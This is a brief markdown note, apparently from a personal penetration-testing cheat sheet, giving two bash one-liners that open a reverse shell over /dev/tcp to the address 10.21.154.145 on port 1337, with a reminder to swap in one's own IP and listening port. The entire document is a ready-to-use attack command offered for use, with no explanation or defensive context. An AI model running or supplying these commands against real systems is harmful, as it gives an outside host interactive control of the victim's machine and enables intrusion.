---
title: "pentestMonkey-oneLinerBashShell"
tags:
  - fetus
---
```sh
bash -i >& /dev/tcp/10.21.154.145/1337 0>&1
```
or 
```sh
bash -c 'exec bash -i &>/dev/tcp/10.21.154.145/1337 <&1'
```
- make sure to change the ip and listening port as needed 